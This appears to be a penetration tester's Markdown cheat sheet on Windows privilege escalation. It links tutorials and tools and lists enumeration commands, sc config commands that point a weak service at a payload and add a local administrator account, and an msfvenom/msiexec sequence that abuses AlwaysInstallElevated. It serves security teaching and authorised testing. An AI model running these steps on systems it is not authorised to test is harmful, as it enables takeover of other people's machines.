# Windows Privilege Escalation #

## Awesome Resources ##

http://www.fuzzysecurity.com/tutorials/16.html

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

https://toshellandback.com/2015/11/24/ms-priv-esc/

https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html

http://www.greyhathacker.net/?p=738

http://www.greyhathacker.net/?p=185

https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/


## Tools ##

https://github.com/GDSSecurity/Windows-Exploit-Suggester

http://www.powershellempire.com/?page_id=378

http://pentestmonkey.net/tools/windows-privesc-check


## Useful Commands ##

**Unquoted Service paths** 

Using WMIC, list service names, display names, executable path and the start mode while grepping (findstr) for any entry without a quote ("). You can also add `findstr /i "Auto"` to only display services that autorun.
For details on how to exploit this and why this is vulnerable check out [Pentest Blog](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
)


```
wmic service get name,displayname,pathname,startmode |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

Alternatively there is a Metasploit module that can check for unquoted service paths and attempt to exploit them. `exploit/windows/local/trusted_service_path`

## Insecure File/Folder Permissions ##
The built-in windows tools `icacls` can be used to check a folder or file permissions. What you are checking for here is the permissions of the user group "Everyone" and your current user to have either Full (F) permissions or modifiable/write(M) permissions.

```
icacls "C:\Program Files\AppName\executable.exe"
```


## Insecure Service Permission Configuration ##

The tool [AccessChk](https://technet.microsoft.com/en-us/sysinternals/accesschk.aspx) can be used in a few different ways check to for services with insecure permissions that may permit a low-priv user to change the services configuration, including the executable the service runs.

After uploading AccessChk the first time it is run you will need to pass `/accepteula`. Below are a few commands that will search for services that any Authenticated User can edit, Display permission for a specific service, or check the entire drive for weak permissions

```
accesschk.exe /accepteula
accesschk.exe -uwcqv "Authenticated Users"
accesschk.exe -ucqv [service_name]
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

Once a weak service has been identified you can alter the service using `sc`

Display the Services Configuration
```
sc qc "Service Name"
```

Alter the binpath of the service to execute a custom executable, add a new user (or any other valid windows command), then add the user to local administrators (After you add the new user). The fourth command `cmd.exe \k` can be used to get around SCM terminating a non-legitimate service (e.g. our malicious executable).
```
sc config "Service Name" binpath= "payload.exe"
sc config "Service Name" binpath= "net user myuser P4ssw0rd@ /add
sc config "Service Name" binpath= "net localgroup Administrators eviladmin /add"
sc config "Service Name" binpath= "cmd.exe /k payload.exe"
```

The service can be started and stopped using:
```
sc stop "Service Name"
sc start "Service Name"
```

If you do not have permissions to restart the service but it's startmode is Auto, try to restart the host machine to get your command/executable to run.

## MSI Always Install Elevated ##

If either of the following registry values is present, windows will always install MSI packages with Elevated permissions. 
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

You can exploit this by using MSFvenom to create a malicious executable (reverse shell or add user), and then a malicious MSI that calls the executable. Upload both then install the MSI package.
```
msfvenom -f msi-nouac -p windows/exec cmd="C:\path\to\Payload.exe" > payload.msi

msiexec /quiet /qn /i payload.msi
```


## Enumeration/Info Commands ##

Display all users on system
```
net users
```

View Scheduled tasks. **Check permissions of tasks, maybe the executable file/folder has weak permissions.** Also check what that task does, is it loading a DLL (with weak permissions), is it loading a modifiable configuration file, or interacting with other services? 
```
schtasks /query /fo LIST /v
```

View started services:
```
tasklist /SVC

netstart
```

OS Version
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```
OS info can also be found in: `C:\Windows\System32\license.rtf`, this is more useful if you don't have a shell such as directory traversal through ftp/web, or LFI.


